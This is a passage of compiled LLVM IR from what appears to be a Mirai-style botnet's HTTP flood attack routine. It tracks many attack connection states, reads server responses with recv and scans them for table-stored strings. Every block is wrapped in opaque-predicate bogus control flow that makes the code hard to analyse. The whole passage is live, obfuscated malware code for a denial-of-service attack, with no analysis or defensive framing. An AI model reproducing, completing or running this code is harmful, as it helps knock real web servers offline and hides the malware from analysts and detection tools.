  %1464 = or i1 %1462, %1463
  br i1 %1464, label %originalBB187, label %originalBB187alteredBB

originalBB187:                                    ; preds = %originalBB187alteredBB, %1456
  %1465 = load i32, i32* %9, align 4
  %1466 = add nsw i32 %1465, 1
  store i32 %1466, i32* %9, align 4
  %1467 = load i32, i32* @x.17
  %1468 = load i32, i32* @y.18
  %1469 = sub i32 %1467, 1
  %1470 = mul i32 %1467, %1469
  %1471 = urem i32 %1470, 2
  %1472 = icmp eq i32 %1471, 0
  %1473 = icmp slt i32 %1468, 10
  %1474 = or i1 %1472, %1473
  br i1 %1474, label %originalBBpart2192, label %originalBB187alteredBB

originalBBpart2192:                               ; preds = %originalBB187
  br label %661

; <label>:1475:                                   ; preds = %661
  %1476 = load i32, i32* @x.17
  %1477 = load i32, i32* @y.18
  %1478 = sub i32 %1476, 1
  %1479 = mul i32 %1476, %1478
  %1480 = urem i32 %1479, 2
  %1481 = icmp eq i32 %1480, 0
  %1482 = icmp slt i32 %1477, 10
  %1483 = or i1 %1481, %1482
  br i1 %1483, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1475
  %1484 = load i32, i32* %23, align 4
  %1485 = icmp eq i32 %1484, 0
  %1486 = load i32, i32* @x.17
  %1487 = load i32, i32* @y.18
  %1488 = sub i32 %1486, 1
  %1489 = mul i32 %1486, %1488
  %1490 = urem i32 %1489, 2
  %1491 = icmp eq i32 %1490, 0
  %1492 = icmp slt i32 %1487, 10
  %1493 = or i1 %1491, %1492
  br i1 %1493, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %1485, label %1494, label %1495

; <label>:1494:                                   ; preds = %originalBBpart2196
  br label %590

; <label>:1495:                                   ; preds = %originalBBpart2196
  %1496 = load i32, i32* @x.17
  %1497 = load i32, i32* @y.18
  %1498 = sub i32 %1496, 1
  %1499 = mul i32 %1496, %1498
  %1500 = urem i32 %1499, 2
  %1501 = icmp eq i32 %1500, 0
  %1502 = icmp slt i32 %1497, 10
  %1503 = or i1 %1501, %1502
  br i1 %1503, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1495
  %1504 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1504, align 8
  %1505 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1505, align 8
  %1506 = load i32, i32* %23, align 4
  %1507 = call i32 @select(i32 %1506, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1507, i32* %24, align 4
  %1508 = call i64 @time(i64* null) #6
  %1509 = trunc i64 %1508 to i32
  store i32 %1509, i32* %27, align 4
  %1510 = load i32, i32* %24, align 4
  %1511 = icmp slt i32 %1510, 1
  %1512 = load i32, i32* @x.17
  %1513 = load i32, i32* @y.18
  %1514 = sub i32 %1512, 1
  %1515 = mul i32 %1512, %1514
  %1516 = urem i32 %1515, 2
  %1517 = icmp eq i32 %1516, 0
  %1518 = icmp slt i32 %1513, 10
  %1519 = or i1 %1517, %1518
  br i1 %1519, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1511, label %1520, label %1521

; <label>:1520:                                   ; preds = %originalBBpart2200
  br label %590

; <label>:1521:                                   ; preds = %originalBBpart2200
  store i32 0, i32* %9, align 4
  br label %1522

; <label>:1522:                                   ; preds = %4233, %1521
  %1523 = load i32, i32* %9, align 4
  %1524 = load i32, i32* %18, align 4
  %1525 = icmp slt i32 %1523, %1524
  br i1 %1525, label %1526, label %4236

; <label>:1526:                                   ; preds = %1522
  %1527 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1528 = load i32, i32* %9, align 4
  %1529 = sext i32 %1528 to i64
  %1530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1527, i64 %1529
  store %struct.attack_http_state* %1530, %struct.attack_http_state** %26, align 8
  %1531 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1531, i32 0, i32 0
  %1533 = load i32, i32* %1532, align 4
  %1534 = icmp eq i32 %1533, -1
  br i1 %1534, label %1535, label %1536

; <label>:1535:                                   ; preds = %1526
  br label %4233

; <label>:1536:                                   ; preds = %1526
  %1537 = load i32, i32* @x.17
  %1538 = load i32, i32* @y.18
  %1539 = sub i32 %1537, 1
  %1540 = mul i32 %1537, %1539
  %1541 = urem i32 %1540, 2
  %1542 = icmp eq i32 %1541, 0
  %1543 = icmp slt i32 %1538, 10
  %1544 = or i1 %1542, %1543
  br i1 %1544, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1536
  %1545 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1546 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1547 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1546, i32 0, i32 0
  %1548 = load i32, i32* %1547, align 4
  %1549 = sdiv i32 %1548, 64
  %1550 = sext i32 %1549 to i64
  %1551 = getelementptr inbounds [16 x i64], [16 x i64]* %1545, i64 0, i64 %1550
  %1552 = load i64, i64* %1551, align 8
  %1553 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1554 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1553, i32 0, i32 0
  %1555 = load i32, i32* %1554, align 4
  %1556 = srem i32 %1555, 64
  %1557 = zext i32 %1556 to i64
  %1558 = shl i64 1, %1557
  %1559 = and i64 %1552, %1558
  %1560 = icmp ne i64 %1559, 0
  %1561 = load i32, i32* @x.17
  %1562 = load i32, i32* @y.18
  %1563 = sub i32 %1561, 1
  %1564 = mul i32 %1561, %1563
  %1565 = urem i32 %1564, 2
  %1566 = icmp eq i32 %1565, 0
  %1567 = icmp slt i32 %1562, 10
  %1568 = or i1 %1566, %1567
  br i1 %1568, label %originalBBpart2235, label %originalBB202alteredBB

originalBBpart2235:                               ; preds = %originalBB202
  br i1 %1560, label %1569, label %1609

; <label>:1569:                                   ; preds = %originalBBpart2235
  %1570 = load i32, i32* @x.17
  %1571 = load i32, i32* @y.18
  %1572 = sub i32 %1570, 1
  %1573 = mul i32 %1570, %1572
  %1574 = urem i32 %1573, 2
  %1575 = icmp eq i32 %1574, 0
  %1576 = icmp slt i32 %1571, 10
  %1577 = or i1 %1575, %1576
  br i1 %1577, label %originalBB237, label %originalBB237alteredBB

originalBB237:                                    ; preds = %originalBB237alteredBB, %1569
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1578, i32 0, i32 0
  %1580 = load i32, i32* %1579, align 4
  %1581 = bitcast i32* %35 to i8*
  %1582 = call i32 @getsockopt(i32 %1580, i32 1, i32 4, i8* %1581, i32* %36) #6
  store i32 %1582, i32* %12, align 4
  %1583 = load i32, i32* %35, align 4
  %1584 = icmp eq i32 %1583, 0
  %1585 = load i32, i32* @x.17
  %1586 = load i32, i32* @y.18
  %1587 = sub i32 %1585, 1
  %1588 = mul i32 %1585, %1587
  %1589 = urem i32 %1588, 2
  %1590 = icmp eq i32 %1589, 0
  %1591 = icmp slt i32 %1586, 10
  %1592 = or i1 %1590, %1591
  br i1 %1592, label %originalBBpart2239, label %originalBB237alteredBB

originalBBpart2239:                               ; preds = %originalBB237
  br i1 %1584, label %1593, label %1599

; <label>:1593:                                   ; preds = %originalBBpart2239
  %1594 = load i32, i32* %12, align 4
  %1595 = icmp eq i32 %1594, 0
  br i1 %1595, label %1596, label %1599

; <label>:1596:                                   ; preds = %1593
  %1597 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1598 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1597, i32 0, i32 1
  store i8 4, i8* %1598, align 4
  br label %1608

; <label>:1599:                                   ; preds = %1593, %originalBBpart2239
  %1600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1600, i32 0, i32 0
  %1602 = load i32, i32* %1601, align 4
  %1603 = call i32 @close(i32 %1602)
  %1604 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1604, i32 0, i32 0
  store i32 -1, i32* %1605, align 4
  %1606 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1607 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1606, i32 0, i32 1
  store i8 0, i8* %1607, align 4
  br label %4233

; <label>:1608:                                   ; preds = %1596
  br label %1609

; <label>:1609:                                   ; preds = %1608, %originalBBpart2235
  %1610 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1611 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1611, i32 0, i32 0
  %1613 = load i32, i32* %1612, align 4
  %1614 = sdiv i32 %1613, 64
  %1615 = sext i32 %1614 to i64
  %1616 = getelementptr inbounds [16 x i64], [16 x i64]* %1610, i64 0, i64 %1615
  %1617 = load i64, i64* %1616, align 8
  %1618 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1619 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1618, i32 0, i32 0
  %1620 = load i32, i32* %1619, align 4
  %1621 = srem i32 %1620, 64
  %1622 = zext i32 %1621 to i64
  %1623 = shl i64 1, %1622
  %1624 = and i64 %1617, %1623
  %1625 = icmp ne i64 %1624, 0
  br i1 %1625, label %1626, label %4216

; <label>:1626:                                   ; preds = %1609
  %1627 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1628 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1627, i32 0, i32 1
  %1629 = load i8, i8* %1628, align 4
  %1630 = zext i8 %1629 to i32
  %1631 = icmp eq i32 %1630, 6
  br i1 %1631, label %1632, label %3411

; <label>:1632:                                   ; preds = %1626
  %1633 = load i32, i32* @x.17
  %1634 = load i32, i32* @y.18
  %1635 = sub i32 %1633, 1
  %1636 = mul i32 %1633, %1635
  %1637 = urem i32 %1636, 2
  %1638 = icmp eq i32 %1637, 0
  %1639 = icmp slt i32 %1634, 10
  %1640 = or i1 %1638, %1639
  br i1 %1640, label %originalBB241, label %originalBB241alteredBB

originalBB241:                                    ; preds = %originalBB241alteredBB, %1632
  store i32 0, i32* %37, align 4
  %1641 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1641, i32 10240)
  %1642 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1643 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1642, i32 0, i32 0
  %1644 = load i32, i32* %1643, align 4
  %1645 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1646 = call i64 @recv(i32 %1644, i8* %1645, i64 10240, i32 16386)
  %1647 = trunc i64 %1646 to i32
  store i32 %1647, i32* %12, align 4
  %1648 = icmp slt i32 %1647, 1
  %1649 = load i32, i32* @x.17
  %1650 = load i32, i32* @y.18
  %1651 = sub i32 %1649, 1
  %1652 = mul i32 %1649, %1651
  %1653 = urem i32 %1652, 2
  %1654 = icmp eq i32 %1653, 0
  %1655 = icmp slt i32 %1650, 10
  %1656 = or i1 %1654, %1655
  br i1 %1656, label %originalBBpart2243, label %originalBB241alteredBB

originalBBpart2243:                               ; preds = %originalBB241
  br i1 %1648, label %1657, label %1666

; <label>:1657:                                   ; preds = %originalBBpart2243
  %1658 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1659 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1658, i32 0, i32 0
  %1660 = load i32, i32* %1659, align 4
  %1661 = call i32 @close(i32 %1660)
  %1662 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1662, i32 0, i32 0
  store i32 -1, i32* %1663, align 4
  %1664 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1665 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1664, i32 0, i32 1
  store i8 0, i8* %1665, align 4
  br label %4233

; <label>:1666:                                   ; preds = %originalBBpart2243
  %1667 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1668 = load i32, i32* %12, align 4
  %1669 = call i32 @util_memsearch(i8* %1667, i32 %1668, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1670 = icmp eq i32 %1669, -1
  br i1 %1670, label %1671, label %1691

; <label>:1671:                                   ; preds = %1666
  %1672 = load i32, i32* %12, align 4
  %1673 = icmp slt i32 %1672, 10240
  br i1 %1673, label %1674, label %1691

; <label>:1674:                                   ; preds = %1671
  %1675 = load i32, i32* @x.17
  %1676 = load i32, i32* @y.18
  %1677 = sub i32 %1675, 1
  %1678 = mul i32 %1675, %1677
  %1679 = urem i32 %1678, 2
  %1680 = icmp eq i32 %1679, 0
  %1681 = icmp slt i32 %1676, 10
  %1682 = or i1 %1680, %1681
  br i1 %1682, label %originalBB245, label %originalBB245alteredBB

originalBB245:                                    ; preds = %originalBB245alteredBB, %1674
  %1683 = load i32, i32* @x.17
  %1684 = load i32, i32* @y.18
  %1685 = sub i32 %1683, 1
  %1686 = mul i32 %1683, %1685
  %1687 = urem i32 %1686, 2
  %1688 = icmp eq i32 %1687, 0
  %1689 = icmp slt i32 %1684, 10
  %1690 = or i1 %1688, %1689
  br i1 %1690, label %originalBBpart2247, label %originalBB245alteredBB

originalBBpart2247:                               ; preds = %originalBB245
  br label %4233

; <label>:1691:                                   ; preds = %1671, %1666
  %1692 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1693 = load i32, i32* %12, align 4
  %1694 = call i32 @util_memsearch(i8* %1692, i32 %1693, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1695 = sext i32 %1694 to i64
  %1696 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1695
  store i8 0, i8* %1696, align 1
  %1697 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1698 = load i32, i32* %12, align 4
  %1699 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1700 = call i32 @util_stristr(i8* %1697, i32 %1698, i8* %1699)
  %1701 = icmp ne i32 %1700, -1
  br i1 %1701, label %1702, label %1705

; <label>:1702:                                   ; preds = %1691
  %1703 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1704 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1703, i32 0, i32 11
  store i32 2, i32* %1704, align 4
  br label %1705

; <label>:1705:                                   ; preds = %1702, %1691
  %1706 = load i32, i32* @x.17
  %1707 = load i32, i32* @y.18
  %1708 = sub i32 %1706, 1
  %1709 = mul i32 %1706, %1708
  %1710 = urem i32 %1709, 2
  %1711 = icmp eq i32 %1710, 0
  %1712 = icmp slt i32 %1707, 10
  %1713 = or i1 %1711, %1712
  br i1 %1713, label %originalBB249, label %originalBB249alteredBB

originalBB249:                                    ; preds = %originalBB249alteredBB, %1705
  %1714 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1715 = load i32, i32* %12, align 4
  %1716 = call i8* @table_retrieve_val(i32 52, i32* null)
  %1717 = call i32 @util_stristr(i8* %1714, i32 %1715, i8* %1716)
  %1718 = icmp ne i32 %1717, -1
  %1719 = load i32, i32* @x.17
  %1720 = load i32, i32* @y.18
  %1721 = sub i32 %1719, 1
  %1722 = mul i32 %1719, %1721
  %1723 = urem i32 %1722, 2
  %1724 = icmp eq i32 %1723, 0
  %1725 = icmp slt i32 %1720, 10
  %1726 = or i1 %1724, %1725
  br i1 %1726, label %originalBBpart2251, label %originalBB249alteredBB

originalBBpart2251:                               ; preds = %originalBB249
  br i1 %1718, label %1727, label %1746

; <label>:1727:                                   ; preds = %originalBBpart2251
  %1728 = load i32, i32* @x.17
  %1729 = load i32, i32* @y.18
  %1730 = sub i32 %1728, 1
  %1731 = mul i32 %1728, %1730
  %1732 = urem i32 %1731, 2
  %1733 = icmp eq i32 %1732, 0
  %1734 = icmp slt i32 %1729, 10
  %1735 = or i1 %1733, %1734
  br i1 %1735, label %originalBB253, label %originalBB253alteredBB

originalBB253:                                    ; preds = %originalBB253alteredBB, %1727
  %1736 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1737 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1736, i32 0, i32 11
  store i32 1, i32* %1737, align 4
  %1738 = load i32, i32* @x.17
  %1739 = load i32, i32* @y.18
  %1740 = sub i32 %1738, 1
  %1741 = mul i32 %1738, %1740
  %1742 = urem i32 %1741, 2
  %1743 = icmp eq i32 %1742, 0
  %1744 = icmp slt i32 %1739, 10
  %1745 = or i1 %1743, %1744
  br i1 %1745, label %originalBBpart2255, label %originalBB253alteredBB

originalBBpart2255:                               ; preds = %originalBB253
  br label %1746

; <label>:1746:                                   ; preds = %originalBBpart2255, %originalBBpart2251
  %1747 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1748 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1747, i32 0, i32 12
  store i32 0, i32* %1748, align 4
  %1749 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1750 = load i32, i32* %12, align 4
  %1751 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1752 = call i32 @util_stristr(i8* %1749, i32 %1750, i8* %1751)
  %1753 = icmp ne i32 %1752, -1
  br i1 %1753, label %1754, label %1853

; <label>:1754:                                   ; preds = %1746
  %1755 = load i32, i32* @x.17
  %1756 = load i32, i32* @y.18
  %1757 = sub i32 %1755, 1
  %1758 = mul i32 %1755, %1757
  %1759 = urem i32 %1758, 2
  %1760 = icmp eq i32 %1759, 0
  %1761 = icmp slt i32 %1756, 10
  %1762 = or i1 %1760, %1761
  br i1 %1762, label %originalBB257, label %originalBB257alteredBB

originalBB257:                                    ; preds = %originalBB257alteredBB, %1754
  %1763 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1764 = load i32, i32* %12, align 4
  %1765 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1766 = call i32 @util_stristr(i8* %1763, i32 %1764, i8* %1765)
  store i32 %1766, i32* %38, align 4
  %1767 = load i32, i32* %38, align 4
  %1768 = sext i32 %1767 to i64
  %1769 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1768
  %1770 = load i8, i8* %1769, align 1
  %1771 = sext i8 %1770 to i32
  %1772 = icmp eq i32 %1771, 32
  %1773 = load i32, i32* @x.17
  %1774 = load i32, i32* @y.18
  %1775 = sub i32 %1773, 1
  %1776 = mul i32 %1773, %1775
  %1777 = urem i32 %1776, 2
  %1778 = icmp eq i32 %1777, 0
  %1779 = icmp slt i32 %1774, 10
  %1780 = or i1 %1778, %1779
  br i1 %1780, label %originalBBpart2259, label %originalBB257alteredBB

originalBBpart2259:                               ; preds = %originalBB257
  br i1 %1772, label %1781, label %1800

; <label>:1781:                                   ; preds = %originalBBpart2259
  %1782 = load i32, i32* @x.17
  %1783 = load i32, i32* @y.18
  %1784 = sub i32 %1782, 1
  %1785 = mul i32 %1782, %1784
  %1786 = urem i32 %1785, 2
  %1787 = icmp eq i32 %1786, 0
  %1788 = icmp slt i32 %1783, 10
  %1789 = or i1 %1787, %1788
  br i1 %1789, label %originalBB261, label %originalBB261alteredBB

originalBB261:                                    ; preds = %originalBB261alteredBB, %1781
  %1790 = load i32, i32* %38, align 4
  %1791 = add nsw i32 %1790, 1
  store i32 %1791, i32* %38, align 4
  %1792 = load i32, i32* @x.17
  %1793 = load i32, i32* @y.18
  %1794 = sub i32 %1792, 1
  %1795 = mul i32 %1792, %1794
  %1796 = urem i32 %1795, 2
  %1797 = icmp eq i32 %1796, 0
  %1798 = icmp slt i32 %1793, 10
  %1799 = or i1 %1797, %1798
  br i1 %1799, label %originalBBpart2263, label %originalBB261alteredBB

originalBBpart2263:                               ; preds = %originalBB261
  br label %1800

; <label>:1800:                                   ; preds = %originalBBpart2263, %originalBBpart2259
  %1801 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1802 = load i32, i32* %38, align 4
  %1803 = sext i32 %1802 to i64
  %1804 = getelementptr inbounds i8, i8* %1801, i64 %1803
  %1805 = load i32, i32* %12, align 4
  %1806 = load i32, i32* %38, align 4
  %1807 = sub nsw i32 %1805, %1806
  %1808 = call i32 @util_memsearch(i8* %1804, i32 %1807, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1808, i32* %39, align 4
  %1809 = load i32, i32* %39, align 4
  %1810 = icmp ne i32 %1809, -1
  br i1 %1810, label %1811, label %1836

; <label>:1811:                                   ; preds = %1800
  %1812 = load i32, i32* %38, align 4
  %1813 = sext i32 %1812 to i64
  %1814 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1813
  store i8* %1814, i8** %40, align 8
  %1815 = load i32, i32* %39, align 4
  %1816 = icmp sge i32 %1815, 2
  br i1 %1816, label %1817, label %1820

; <label>:1817:                                   ; preds = %1811
  %1818 = load i32, i32* %39, align 4
  %1819 = sub nsw i32 %1818, 2
  store i32 %1819, i32* %39, align 4
  br label %1820

; <label>:1820:                                   ; preds = %1817, %1811
  %1821 = load i32, i32* %38, align 4
  %1822 = load i32, i32* %39, align 4
  %1823 = add nsw i32 %1821, %1822
  %1824 = sext i32 %1823 to i64
  %1825 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1824
  store i8 0, i8* %1825, align 1
  %1826 = load i8*, i8** %40, align 8
  %1827 = load i8*, i8** %40, align 8
  %1828 = call i32 @util_strlen(i8* %1827)
  %1829 = call i8* @table_retrieve_val(i32 50, i32* null)
  %1830 = call i32 @util_stristr(i8* %1826, i32 %1828, i8* %1829)
  %1831 = icmp ne i32 %1830, 0
  br i1 %1831, label %1832, label %1835

; <label>:1832:                                   ; preds = %1820
  %1833 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1834 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1833, i32 0, i32 12
  store i32 1, i32* %1834, align 4
  br label %1835

; <label>:1835:                                   ; preds = %1832, %1820
  br label %1836

; <label>:1836:                                   ; preds = %1835, %1800
  %1837 = load i32, i32* @x.17
  %1838 = load i32, i32* @y.18
  %1839 = sub i32 %1837, 1
  %1840 = mul i32 %1837, %1839
  %1841 = urem i32 %1840, 2
  %1842 = icmp eq i32 %1841, 0
  %1843 = icmp slt i32 %1838, 10
  %1844 = or i1 %1842, %1843
  br i1 %1844, label %originalBB265, label %originalBB265alteredBB

originalBB265:                                    ; preds = %originalBB265alteredBB, %1836
  %1845 = load i32, i32* @x.17
  %1846 = load i32, i32* @y.18
  %1847 = sub i32 %1845, 1
  %1848 = mul i32 %1845, %1847
  %1849 = urem i32 %1848, 2
  %1850 = icmp eq i32 %1849, 0
  %1851 = icmp slt i32 %1846, 10
  %1852 = or i1 %1850, %1851
  br i1 %1852, label %originalBBpart2267, label %originalBB265alteredBB

originalBBpart2267:                               ; preds = %originalBB265
  br label %1853

; <label>:1853:                                   ; preds = %originalBBpart2267, %1746
  %1854 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1855 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1854, i32 0, i32 13
  store i32 0, i32* %1855, align 4
  %1856 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1857 = load i32, i32* %12, align 4
  %1858 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1859 = call i32 @util_stristr(i8* %1856, i32 %1857, i8* %1858)
  %1860 = icmp ne i32 %1859, -1
  br i1 %1860, label %1861, label %1976

; <label>:1861:                                   ; preds = %1853
  %1862 = load i32, i32* @x.17
  %1863 = load i32, i32* @y.18
  %1864 = sub i32 %1862, 1
  %1865 = mul i32 %1862, %1864
  %1866 = urem i32 %1865, 2
  %1867 = icmp eq i32 %1866, 0
  %1868 = icmp slt i32 %1863, 10
  %1869 = or i1 %1867, %1868
  br i1 %1869, label %originalBB269, label %originalBB269alteredBB

originalBB269:                                    ; preds = %originalBB269alteredBB, %1861
  %1870 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1871 = load i32, i32* %12, align 4
  %1872 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1873 = call i32 @util_stristr(i8* %1870, i32 %1871, i8* %1872)
  store i32 %1873, i32* %41, align 4
  %1874 = load i32, i32* %41, align 4
  %1875 = sext i32 %1874 to i64
  %1876 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1875
  %1877 = load i8, i8* %1876, align 1
  %1878 = sext i8 %1877 to i32
  %1879 = icmp eq i32 %1878, 32
  %1880 = load i32, i32* @x.17
  %1881 = load i32, i32* @y.18
  %1882 = sub i32 %1880, 1
  %1883 = mul i32 %1880, %1882
  %1884 = urem i32 %1883, 2
  %1885 = icmp eq i32 %1884, 0
  %1886 = icmp slt i32 %1881, 10
  %1887 = or i1 %1885, %1886
  br i1 %1887, label %originalBBpart2271, label %originalBB269alteredBB

originalBBpart2271:                               ; preds = %originalBB269
  br i1 %1879, label %1888, label %1891

; <label>:1888:                                   ; preds = %originalBBpart2271
  %1889 = load i32, i32* %41, align 4
  %1890 = add nsw i32 %1889, 1
  store i32 %1890, i32* %41, align 4
  br label %1891

; <label>:1891:                                   ; preds = %1888, %originalBBpart2271
  %1892 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1893 = load i32, i32* %41, align 4
  %1894 = sext i32 %1893 to i64
  %1895 = getelementptr inbounds i8, i8* %1892, i64 %1894
  %1896 = load i32, i32* %12, align 4
  %1897 = load i32, i32* %41, align 4
  %1898 = sub nsw i32 %1896, %1897
  %1899 = call i32 @util_memsearch(i8* %1895, i32 %1898, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1899, i32* %42, align 4
  %1900 = load i32, i32* %42, align 4
  %1901 = icmp ne i32 %1900, -1
  br i1 %1901, label %1902, label %1975

; <label>:1902:                                   ; preds = %1891
  %1903 = load i32, i32* @x.17
  %1904 = load i32, i32* @y.18
  %1905 = sub i32 %1903, 1
  %1906 = mul i32 %1903, %1905
  %1907 = urem i32 %1906, 2
  %1908 = icmp eq i32 %1907, 0
  %1909 = icmp slt i32 %1904, 10
  %1910 = or i1 %1908, %1909
  br i1 %1910, label %originalBB273, label %originalBB273alteredBB

originalBB273:                                    ; preds = %originalBB273alteredBB, %1902
  %1911 = load i32, i32* %41, align 4
  %1912 = sext i32 %1911 to i64
  %1913 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1912
  store i8* %1913, i8** %43, align 8
  %1914 = load i32, i32* %42, align 4
  %1915 = icmp sge i32 %1914, 2
  %1916 = load i32, i32* @x.17
  %1917 = load i32, i32* @y.18
  %1918 = sub i32 %1916, 1
  %1919 = mul i32 %1916, %1918
  %1920 = urem i32 %1919, 2
  %1921 = icmp eq i32 %1920, 0
  %1922 = icmp slt i32 %1917, 10
  %1923 = or i1 %1921, %1922
  br i1 %1923, label %originalBBpart2275, label %originalBB273alteredBB

originalBBpart2275:                               ; preds = %originalBB273
  br i1 %1915, label %1924, label %1927

; <label>:1924:                                   ; preds = %originalBBpart2275
  %1925 = load i32, i32* %42, align 4
  %1926 = sub nsw i32 %1925, 2
  store i32 %1926, i32* %42, align 4
  br label %1927

; <label>:1927:                                   ; preds = %1924, %originalBBpart2275
  %1928 = load i32, i32* %41, align 4
  %1929 = load i32, i32* %42, align 4
  %1930 = add nsw i32 %1928, %1929
  %1931 = sext i32 %1930 to i64
  %1932 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1931
  store i8 0, i8* %1932, align 1
  %1933 = load i8*, i8** %43, align 8
  %1934 = load i8*, i8** %43, align 8
  %1935 = call i32 @util_strlen(i8* %1934)
  %1936 = call i8* @table_retrieve_val(i32 49, i32* null)
  %1937 = call i32 @util_stristr(i8* %1933, i32 %1935, i8* %1936)
  %1938 = icmp ne i32 %1937, 0
  br i1 %1938, label %1939, label %1958

; <label>:1939:                                   ; preds = %1927
  %1940 = load i32, i32* @x.17
  %1941 = load i32, i32* @y.18
  %1942 = sub i32 %1940, 1
  %1943 = mul i32 %1940, %1942
  %1944 = urem i32 %1943, 2
  %1945 = icmp eq i32 %1944, 0
  %1946 = icmp slt i32 %1941, 10
  %1947 = or i1 %1945, %1946
  br i1 %1947, label %originalBB277, label %originalBB277alteredBB

originalBB277:                                    ; preds = %originalBB277alteredBB, %1939
  %1948 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1949 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1948, i32 0, i32 13
  store i32 1, i32* %1949, align 4
  %1950 = load i32, i32* @x.17
  %1951 = load i32, i32* @y.18
